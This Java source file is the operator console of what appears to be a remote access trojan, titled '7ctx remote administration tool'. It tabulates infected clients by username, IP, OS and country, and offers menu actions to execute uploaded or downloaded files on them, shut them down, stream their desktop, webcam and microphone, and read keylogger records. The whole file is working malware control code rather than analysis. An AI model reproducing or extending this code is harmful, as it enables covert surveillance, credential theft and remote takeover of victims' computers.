/*
 * Copyright (c) 2021, 7ctx <https://github.com/7ctx/> 
 * Email: <7ctx@mail.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package com.ctx.server.ui;

import com.protocol.packets.beans.Client;
import com.ctx.server.ui.impl.DownloadExecuteUI;
import com.ctx.server.ChannelHandler;
import com.ctx.server.Constants;
import com.ctx.server.ui.impl.SocketConfigurationUI;
import com.protocol.packets.impl.DisconnectPacket;
import com.protocol.packets.impl.ReconnectPacket;
import com.protocol.packets.impl.RemoteDesktopPacket;
import com.protocol.packets.impl.RemoteWebcamPacket;
import com.protocol.packets.impl.RestartPCPacket;
import com.protocol.packets.impl.ShutdownPCPacket;
import com.ctx.server.ui.impl.KeylogRecordViewerUI;
import com.ctx.server.ui.impl.RemoteDesktopUI;
import com.ctx.server.ui.impl.RemoteMicrophoneUI;
import com.ctx.server.ui.impl.RemoteWebcamUI;
import com.ctx.server.ui.impl.UploadExecuteUI;
import io.netty.channel.ChannelId;
import java.awt.AlphaComposite;
import java.awt.Component;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.event.ActionEvent;
import java.awt.event.FocusEvent;
import java.awt.event.FocusListener;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.util.HashSet;
import java.util.Set;
import javax.swing.ImageIcon;
import javax.swing.JComponent;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPopupMenu;
import javax.swing.JTable;
import javax.swing.ListSelectionModel;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableCellRenderer;
import lombok.extern.slf4j.Slf4j;

@Slf4j
public class UI extends javax.swing.JFrame
{
    private javax.swing.JMenuBar menuBar;
    private javax.swing.JMenu configMenu;
    private javax.swing.JMenuItem socketConfigMenuItem;
    
    private static javax.swing.JTable clientsTable;
    private javax.swing.JScrollPane jScrollPane1;

    private final Set<ChannelId> selectedClients = new HashSet();
    
    private JPopupMenu popupMenu;
    private JMenuItem disconnectMenuItem;
    private JMenuItem reconnectMenuItem;
    private JMenuItem shutdownComputerMenuItem;
    private JMenuItem restartComputerMenuItem;
    private JMenuItem uploadExecuteMenuItem;
    private JMenuItem downloadExecuteMenuItem;
    private JMenuItem remoteDesktopMenuItem;
    private JMenuItem remoteWebcamMenuItem;
    private JMenuItem remoteMicrophoneMenuItem;
    private JMenuItem keylogRecordViewerMenuItem;
    
    public UI() 
    {
        initComponents();
    }
    
    public static void addClient(Client client) 
    {
        Object[] objects = new Object[]
        {
            client.getChannelId(), 
            client.getUsername(), 
            client.getIp(), 
            client.getOsName(), 
            client.getOsType(), 
            client.getOsVersion(), 
            client.getJavaVersion(),
            client.getCountry(),
            client.getLanguage(),
            client.getAvailableProcessors(),
            client.getTotalPsychicalMemory(),
            client.getDiskSpace()
        };
        DefaultTableModel tableModel = (DefaultTableModel) UI.clientsTable.getModel();
        tableModel.addRow(objects);
    }
    
    public static void removeClient(ChannelId channelId) 
    {
        DefaultTableModel tableModel = (DefaultTableModel) UI.clientsTable.getModel();
        int row = -1;

        for (int i = 0; i < tableModel.getRowCount(); ++i) 
        {
            if (tableModel.getValueAt(i, 0).equals(channelId)) 
            {
                row = i;
                break;
            }
        }

        if (row != -1) 
        {
            tableModel.removeRow(row);
        }
    }
    
    /**
     * Set selected rows
     *
     * @param table
     * @param rows
     */
    private void setSelectedRows(JTable table, int[] rows) 
    {
        ListSelectionModel model = table.getSelectionModel();
        model.clearSelection();

        for (int row : rows) 
        {
            model.addSelectionInterval(row, row);
            log.debug("selected row: {}", row);
        }
    }

    /**
     * Set selected clients <ChannelId> used to select clients based on
     * ChannelId
     *
     * @param table
     * @param rows
     */
    private void setSelectedClients(int[] rows) 
    {
        selectedClients.clear();
        
        for (int row : rows) 
        {
            ChannelId channelId = (ChannelId) clientsTable.getValueAt(row, 0);
            selectedClients.add(channelId);
            log.debug("selected client: {}", channelId);
        }
    }
    
    /**
     * initialize components
     */
    private void initComponents() 
    {
        setTitle("7ctx remote administration tool");
        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setIconImage(getToolkit().getImage(getClass().getResource("/icons/7.png")));
        
        menuBar = new javax.swing.JMenuBar();
        configMenu = new javax.swing.JMenu();
        socketConfigMenuItem = new javax.swing.JMenuItem();
        
        configMenu.setText("config");
        socketConfigMenuItem.setText("socket");
        configMenu.add(socketConfigMenuItem);
        
        menuBar.add(configMenu);
        setJMenuBar(menuBar);
        
        socketConfigMenuItem.addActionListener((ActionEvent e) -> 
        {
            SocketConfigurationUI socketUI = new SocketConfigurationUI();
            socketUI.setVisible(true);
            System.out.println("pressed");
        });
        
        jScrollPane1 = new javax.swing.JScrollPane();
        clientsTable = new javax.swing.JTable() 
        {
            final ImageIcon image = new ImageIcon(getClass().getResource("/images/background.jpg"));

            @Override
            public Component prepareRenderer(TableCellRenderer renderer, int row, int column) 
            {
                final Component c = super.prepareRenderer(renderer, row, column);
                if (c instanceof JComponent) 
                {
                    ((JComponent) c).setOpaque(false);
                }
                return c;
            }

            @Override
            public void paint(Graphics g) 
            {
                // Set opacity
                Graphics2D g2D = (Graphics2D) g;
                float opacity = 0.8f;
                g2D.setComposite(AlphaComposite.getInstance(AlphaComposite.SRC_OVER, opacity));
                
                // Scaled with table
                g.drawImage(image.getImage(), 0, 0, this.getWidth(), this.getHeight(), null);
                super.paint(g);
            }
        };
        
        clientsTable.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] 
            {

            },
            new String [] 
            {
                "channelId", "username", "ip", "osName", "osType", "osVersion", "javaVersion", "country", "language", "availableProcessors", "totalPsychicalMemory", "diskSpace"
            }
        ) {
            boolean[] canEdit = new boolean [] 
            {
                false, false, false, false, false, false, false, false, false, false, false, false
            };

            @Override
            public boolean isCellEditable(int rowIndex, int columnIndex) 
            {
                return canEdit [columnIndex];
            }
        });
        
        clientsTable.setToolTipText("");
        clientsTable.setCursor(new java.awt.Cursor(java.awt.Cursor.CROSSHAIR_CURSOR));
        
        clientsTable.getTableHeader().setReorderingAllowed(false);
        
        clientsTable.setSelectionMode(ListSelectionModel.MULTIPLE_INTERVAL_SELECTION);
        clientsTable.setCellSelectionEnabled(true);
        clientsTable.setRowSelectionAllowed(true);
        clientsTable.setColumnSelectionAllowed(false);
        
        clientsTable.setShowGrid(true);
       
        clientsTable.setOpaque(false);
        clientsTable.setAutoscrolls(true);
        clientsTable.setShowHorizontalLines(true);
        clientsTable.setShowVerticalLines(true);
        
        clientsTable.setFillsViewportHeight(true);
        
        jScrollPane1.setViewportView(clientsTable);
        
        popupMenu = new JPopupMenu();
        popupMenu.setLabel("Packets");
        
        disconnectMenuItem = new JMenuItem("Disconnect");
        disconnectMenuItem.setIcon(new ImageIcon(getClass().getResource("/icons/16x16/disconnect.png")));
        disconnectMenuItem.addActionListener((ActionEvent e) -> 
        {
            log.debug("disconnectMenuItem: {} | {}", selectedClients, e.toString());
            int option = JOptionPane.showConfirmDialog(rootPane, "Are you sure you want to disconnect: " + selectedClients.toString());
            if (option != 0) 
            {
                return;
            }
            
            DisconnectPacket packet = new DisconnectPacket();
            for (ChannelId channelId : selectedClients) 
            {
                ChannelHandler.writePacket(channelId, packet);
            }
        });
        
        reconnectMenuItem = new JMenuItem("Reconnect");
        reconnectMenuItem.setIcon(new ImageIcon(getClass().getResource("/icons/16x16/reconnect.png")));
        reconnectMenuItem.addActionListener((ActionEvent e) -> 
        {
            log.debug("reconnectMenuItem: {} | {}", selectedClients.toString(), e.toString());
            int option = JOptionPane.showConfirmDialog(rootPane, "Are you sure you want to reconnect: " + selectedClients.toString());
            if (option != 0) 
            {
                return;
            }
            
            ReconnectPacket packet = new ReconnectPacket();
            for (ChannelId channelId : selectedClients) 
            {
                ChannelHandler.writePacket(channelId, packet);
            }
        });
        
        shutdownComputerMenuItem = new JMenuItem("Shutdown PC");
        shutdownComputerMenuItem.setIcon(new ImageIcon(getClass().getResource("/icons/16x16/shutdown.png")));
        shutdownComputerMenuItem.addActionListener((ActionEvent e) -> 
        {
            log.debug("shutdownComputerMenuItem: {} | {}", selectedClients.toString(), e.toString());
            int option = JOptionPane.showConfirmDialog(rootPane, "Are you sure you want to shutdown pc: " + selectedClients.toString());
            if (option != 0) 
            {
                return;
            }
                
              ShutdownPCPacket shutdownComputerPacket = new ShutdownPCPacket();
              for (ChannelId channelId : selectedClients) 
              {
                ChannelHandler.writePacket(channelId, shutdownComputerPacket);
              }
        });
        
        restartComputerMenuItem = new JMenuItem("Restart PC");
        restartComputerMenuItem.setIcon(new ImageIcon(getClass().getResource("/icons/16x16/restart.png")));
        restartComputerMenuItem.addActionListener((ActionEvent e) -> 
        {
            log.debug("restartComputerMenuItem: {} | {}", selectedClients.toString(), e.toString());
            int option = JOptionPane.showConfirmDialog(rootPane, "Are you sure you want to restart pc: " + selectedClients.toString());
                if (option != 0) 
                {
                    return;
                }
                
            RestartPCPacket restartComputerPacket = new RestartPCPacket();
            for (ChannelId channelId : selectedClients) 
            {
                ChannelHandler.writePacket(channelId, restartComputerPacket);
            }
        });
        
        uploadExecuteMenuItem = new JMenuItem("Upload & execute");
        uploadExecuteMenuItem.setIcon(new ImageIcon(getClass().getResource("/icons/16x16/upload.png")));
        uploadExecuteMenuItem.addActionListener((ActionEvent e) -> 
        {
                log.debug("uploadExecuteMenuItem: {} | {}", selectedClients.toString(), e.toString());
                int rowIndex = clientsTable.getSelectedRow();
                UploadExecuteUI uploadExecuteUI = new UploadExecuteUI(selectedClients);
                uploadExecuteUI.setLocationRelativeTo(this);
                uploadExecuteUI.setVisible(true);
        });
        
        downloadExecuteMenuItem = new JMenuItem("Download & execute");
        downloadExecuteMenuItem.setIcon(new ImageIcon(getClass().getResource("/icons/16x16/download.png")));
        downloadExecuteMenuItem.addActionListener((ActionEvent e) -> 
        {
                log.debug("downloadExecuteMenuItem: {} | {}", selectedClients.toString(), e.toString());
                int rowIndex = clientsTable.getSelectedRow();
                DownloadExecuteUI downloadExecuteUI = new DownloadExecuteUI(selectedClients);
                downloadExecuteUI.setLocationRelativeTo(this);
                downloadExecuteUI.setVisible(true);
        });
        
        remoteDesktopMenuItem = new JMenuItem("Remote desktop");
        remoteDesktopMenuItem.setIcon(new ImageIcon(getClass().getResource("/icons/16x16/desktop.png")));
        remoteDesktopMenuItem.addActionListener((ActionEvent e) -> 
        {
                log.debug("remoteDesktopMenuItem: {} | {}", selectedClients.toString(), e.toString());
                int rowIndex = clientsTable.getSelectedRow();
                ChannelId channelId = (ChannelId) clientsTable.getValueAt(rowIndex, 0);
                
                RemoteDesktopUI remoteDesktopUI = new RemoteDesktopUI(channelId);
                remoteDesktopUI.setLocationRelativeTo(this);
                remoteDesktopUI.setVisible(true);
                
                RemoteDesktopPacket.setCanceled(false);
                RemoteDesktopPacket remoteDesktopPacket = new RemoteDesktopPacket();
                ChannelHandler.writePacket(channelId, remoteDesktopPacket);
        });
        
        remoteWebcamMenuItem = new JMenuItem("Remote webcam");
        remoteWebcamMenuItem.setIcon(new ImageIcon(getClass().getResource("/icons/16x16/webcam.png")));
        remoteWebcamMenuItem.addActionListener((ActionEvent e) -> 
        {
                log.debug("remoteWebcamMenuItem: {} | {}", selectedClients.toString(), e.toString());
                int rowIndex = clientsTable.getSelectedRow();
                ChannelId channelId = (ChannelId) clientsTable.getValueAt(rowIndex, 0);
                                
                RemoteWebcamUI remoteWebcamUI = new RemoteWebcamUI(channelId);
                remoteWebcamUI.setLocationRelativeTo(this);
                remoteWebcamUI.setVisible(true);
                
                RemoteWebcamPacket.setCanceled(false);
                RemoteWebcamPacket remoteWebcamPacket = new RemoteWebcamPacket();
                ChannelHandler.writePacket(channelId, remoteWebcamPacket);
        });
        
        remoteMicrophoneMenuItem = new JMenuItem("Remote microphone");
        remoteMicrophoneMenuItem.setIcon(new ImageIcon(getClass().getResource("/icons/16x16/microphone.png")));
        remoteMicrophoneMenuItem.addActionListener((ActionEvent e) -> 
        {
                log.debug("remoteMicrophoneMenuItem: {} | {}", selectedClients.toString(), e.toString());
                int rowIndex = clientsTable.getSelectedRow();
                ChannelId channelId = (ChannelId) clientsTable.getValueAt(rowIndex, 0);
                
               RemoteMicrophoneUI remoteMicrophoneUI = new RemoteMicrophoneUI(channelId);
               remoteMicrophoneUI.setLocationRelativeTo(this);
               remoteMicrophoneUI.setVisible(true);
        });
        
        keylogRecordViewerMenuItem = new JMenuItem("Keylogger records");
        keylogRecordViewerMenuItem.setIcon(new ImageIcon(getClass().getResource("/icons/16x16/record.png")));
        keylogRecordViewerMenuItem.addActionListener((ActionEvent e) -> 
        {
                log.debug("keylogRecordMenuItem: {} | {}", selectedClients.toString(), e.toString());
                int rowIndex = clientsTable.getSelectedRow();
                ChannelId channelId = (ChannelId) clientsTable.getValueAt(rowIndex, 0);
                
               KeylogRecordViewerUI keylogRecordViewerUI = new KeylogRecordViewerUI(channelId);
               keylogRecordViewerUI.setLocationRelativeTo(this);
               keylogRecordViewerUI.setVisible(true);
        });
        
        popupMenu.add(disconnectMenuItem);
        popupMenu.add(reconnectMenuItem);
        popupMenu.add(shutdownComputerMenuItem);
        popupMenu.add(restartComputerMenuItem);
        popupMenu.add(uploadExecuteMenuItem);
        popupMenu.add(downloadExecuteMenuItem);
        popupMenu.add(remoteDesktopMenuItem);
        popupMenu.add(remoteWebcamMenuItem);
        popupMenu.add(remoteMicrophoneMenuItem);
        popupMenu.add(keylogRecordViewerMenuItem);
        
        clientsTable.addMouseListener(new MouseAdapter() 
        {
            @Override
            public void mouseReleased(MouseEvent e) 
            {
                 int r = clientsTable.rowAtPoint(e.getPoint());
                 if (r >= 0 && r < clientsTable.getRowCount()) 
                 {
                     setSelectedRows(clientsTable, clientsTable.getSelectedRows());
                     setSelectedClients(clientsTable.getSelectedRows());
                 } 
                 else 
                 {
                    clientsTable.clearSelection();
                    selectedClients.clear();
                 }

                int rowIndex = clientsTable.getSelectedRow();
                if (rowIndex < 0) 
                {
                    clientsTable.setComponentPopupMenu(null);
                    return;
                }
                
                if (e.getComponent() instanceof JTable) 
                {
                    int LEFT_CLICK_BUTTON = 1;
                    if (e.getButton() == LEFT_CLICK_BUTTON) 
                    {
                        return;
                    }
                    JTable source = (JTable) e.getSource();
                    int row = source.rowAtPoint(e.getPoint());
                    int column = source.columnAtPoint(e.getPoint());

                    if (!source.isRowSelected(row))
                        source.changeSelection(row, column, false, false);
                    popupMenu.show(e.getComponent(), e.getX(), e.getY());
                }
                // Take screenshot when popupMenu is opened
                //Screenshot screenshot = new Screenshot(jScrollPane1.getBounds());
                //Constants.executor.execute(screenshot);
            }
        });
        
        clientsTable.addKeyListener(new KeyListener() 
        {
            @Override
            public void keyTyped(KeyEvent e) 
            {
            }

            @Override
            public void keyPressed(KeyEvent e) 
            {
            }

            @Override
            public void keyReleased(KeyEvent e) 
            {
                setSelectedRows(clientsTable, clientsTable.getSelectedRows());
                setSelectedClients(clientsTable.getSelectedRows());
            }
        });
        
        clientsTable.addFocusListener(new FocusListener() 
        {
            @Override
            public void focusGained(FocusEvent e) 
            {
                log.debug("{}", e);
            }

            @Override
            public void focusLost(FocusEvent e) 
            {
                log.debug("{}", e);
            }
        });
        
        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 785, Short.MAX_VALUE)
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 329, Short.MAX_VALUE)
                .addContainerGap())
        );

        setBounds(0, 0, 819, 404);
        
        pack();
    }                      
}
